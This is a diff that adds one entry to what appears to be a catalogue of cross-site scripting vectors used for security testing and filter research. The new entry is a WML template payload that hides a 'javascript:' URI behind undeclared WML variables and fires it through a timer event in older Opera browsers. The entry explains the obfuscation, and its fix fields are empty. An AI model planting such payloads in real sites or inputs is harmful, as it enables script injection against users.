@@ -2598,5 +2598,34 @@ var items =
         },
         'tags'       : ['xss', 'javascript', 'xml stylesheet', 'css', 'internet explorer', 'expression',  'xml'],
         'reporter'   : '.mario, LeverOne'
+    },
+    { /* ID 83 - Obfuscation unsafe parameter via wml-variables. */
+        'id'         : 83,
+        'category'   : 'xml', 
+        'name'       : {
+            'en' : 'Obfuscation unsafe parameter via wml-variables.',
+            'ja' : '',
+            'ru' : 'Обфускация опасного параметра с использованием wml-переменных',
+            'de' : ''
+        },
+        'data'       : '<x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:%js_alert%"><x:timer value="1"/></x:template>',
+        'description': {
+            'en' : 'The example demonstrates the use in WML undeclared variables (are ignored). These variables can be declared in the tags "setvar", "input", "select". Namespace indicated for use inside the XML-file. Also inside WML-files can you use a lot of regular HTML-tags.', 
+            'ja' : '',
+            'ru' : 'Пример демонстрирует использование в WML необъявленных переменных, которые будут игнорироваться. Эти переменные можно объявить в тегах "setvar", "input", "select". Пространство имен указано для использования в XML-файле. Не забывайте, что внутри WML-файлов вы можете использовать множество обычных HTML-тегов. ',
+            'de' : ''
+        },
+        'urls'    : ['http://www.w3schools.com/wap/wml_variables.asp'],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'opera': ['9.x', '10.x', 'mobile']
+        },
+        'tags'       : ['xss', 'javascript', 'wml', 'opera', 'mobile', 'timer', 'variable'],
+        'reporter'   : 'LeverOne, .mario'
     }
 ]
